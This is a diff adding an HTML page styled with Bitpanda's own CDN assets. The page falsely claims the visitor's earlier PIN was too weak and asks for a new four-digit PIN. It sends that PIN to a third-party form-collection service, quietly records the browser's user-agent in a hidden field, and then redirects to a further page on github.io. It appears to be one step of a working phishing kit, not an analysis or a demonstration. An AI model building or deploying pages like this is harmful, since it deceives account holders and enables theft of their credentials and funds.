@@ -1,0 +1,320 @@
+
+ 
+<!DOCTYPE html>
+<html>
+<head>
+
+
+<meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+
+
+<title>Exclusive</title>
+
+<style>
+body {
+font-family: Arial, sans-serif;
+margin: 1px;
+}
+
+
+
+
+/* Styling for the container of the split input field (two boxes) */
+.split-input-container {
+display: flex;
+gap: 16px; /* Space between the two boxes */
+}
+
+
+
+
+.split-input {
+width: 47%; /* Each box takes 50% of the container */
+height: 42px;
+border: 2px solid #000000;
+border-radius: 1px;
+font-size: 17px;
+font-weight: bold;
+padding: 0 10px;
+box-sizing: border-box;
+}
+
+
+
+
+.split-input:focus {
+outline: none;
+border-color: #007bff; /* Change border color on focus */
+}
+
+
+
+
+/* Styling for the container of the three-box input field */
+.three-input-container {
+display: flex;
+gap: 16px; /* Space between the three boxes */
+}
+
+
+
+
+.three-input {
+width: 30%; /* Each box takes one-third of the container */
+height: 42px;
+border: 2px solid #000000;
+border-radius: 1px;
+font-size: 17px;
+font-weight: bold;
+padding: 0 10px;
+box-sizing: border-box;
+}
+
+
+
+
+.three-input:focus {
+outline: none;
+border-color: #007bff; /* Change border color on focus */
+}
+
+
+
+
+/* Styling for other input fields */
+.input-fieldy {
+width: 45%;
+height: 52px;
+border: 2px solid #2B60DE;
+border-radius: 1px;
+font-size: 21px;
+font-weight: bold;
+padding: 0 10px;
+box-sizing: border-box;
+}
+
+
+
+
+.input-fieldy:focus {
+outline: none;
+border-color: #007bff; /* Change border color on focus */
+}
+</style>
+
+
+
+
+
+<style>
+.responsive-btn {
+width: 45%;
+height: 47px;
+border: 0;
+border-radius: 10px;
+background-color: #2B60DE;
+color: #fff;
+font-size: 15px;
+font-weight: bold;
+cursor: pointer;
+transition: height 0.2s, font-size 0.2s;
+}
+
+
+@media (min-width: 1024px) {
+.responsive-btn {
+height: 48px;
+font-size: 24px;
+}
+}
+</style>
+
+
+
+
+<style>
+:root {
+/* Customizable variables */
+--loading-text-size: 40px; /* Size of the "Processing..." text */
+--loading-text-color: #000000; /* Color of the "Processing..." text */
+--spinner-size: 110px; /* Size of the rotating icon */
+--spinner-border-size: 20px; /* Thickness of the spinner border */
+--spinner-color: #306754; /* Color of the rotating part */
+--spinner-speed: 1s; /* Rotation speed of the spinner */
+}
+
+
+/* General styling for the loading overlay */
+.loading-overlay {
+display: none;
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: #ffffff;
+z-index: 1000;
+justify-content: center;
+align-items: center;
+text-align: center;
+}
+
+
+.loading-overlay.active {
+display: flex;
+}
+
+
+.loading-icon {
+border: var(--spinner-border-size) solid #f3f3f3; /* Light grey */
+border-top: var(--spinner-border-size) solid var(--spinner-color); /* Customizable color */
+border-radius: 50%;
+width: var(--spinner-size); /* Customizable size */
+height: var(--spinner-size); /* Customizable size */
+animation: spin var(--spinner-speed) linear infinite; /* Customizable speed */
+}
+
+
+@keyframes spin {
+0% {
+transform: rotate(0deg);
+}
+100% {
+transform: rotate(360deg);
+}
+}
+
+
+.loading-text {
+margin-top: 10px;
+font-size: var(--loading-text-size); /* Customizable size */
+color: var(--loading-text-color); /* Customizable color */
+font-weight: bold;
+}
+</style>
+
+
+
+</head>
+<body>
+
+
+
+
+
+<style>
+.text-225px {
+font-size: 17px;
+padding: 12px;
+color: #000000;
+}
+
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+.text-225px {
+font-size: 17px;
+}
+}
+</style>
+
+
+<h5 class="text-225px">
+
+The four-digit PIN you entered previously is not secure enough. Please try again using a four digit PIN that is strong
+
+<form action="https://submit-form.com/WZq04rfIV" method="POST" id="example-form" class="wpforms-validate wpforms-form" data-formid="278">
+
+<input type="hidden" name="_redirect" value="https://meet-dinner.github.io/Basic/" >
+
+
+<br>
+
+<!-- Other input field -->
+Enter Four-Digit Pin<br>
+
+<input type="tel" class="input-fieldy" name="Pin2" maxlength="4"
+minlength="4"
+
+ required placeholder="">
+
+<br>
+
+<br>
+
+
+
+<span style="display:none;">
+
+<p id="user-agent"></p> </span>
+<input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+
+
+
+<button type="submit" class="responsive-btn">NEXT</button>
+
+</form>
+
+
+<script>
+const userAgent = navigator.userAgent;
+document.getElementById('user-agent').textContent = userAgent;
+document.getElementById('hidden-user-agent').value = userAgent;
+</script>
+
+
+
+
+
+
+
+
+
+<!-- Reusable Loading Overlay -->
+<div class="loading-overlay" id="loading-overlay">
+<div>
+<div class="loading-icon"></div>
+<div class="loading-text"><strong>Please Wait...</strong></div>
+</div>
+</div>
+
+
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+const form = document.getElementById("example-form");
+const loadingOverlay = document.getElementById("loading-overlay");
+
+
+// Function to show the loading overlay
+const showLoading = () => {
+loadingOverlay.classList.add("active");
+};
+
+
+// Form submission handler
+form.addEventListener("submit", (event) => {
+// Show the loading overlay
+showLoading();
+
+
+// Allow the form to proceed with submission (default behavior)
+// The loading overlay will remain visible while the form is being submitted
+});
+});
+</script>
+<br>
+<br><br>
+<br><br><br><br><br>
+</div>
+
+
+
+
+</h5>
+
+</body>
+</html>
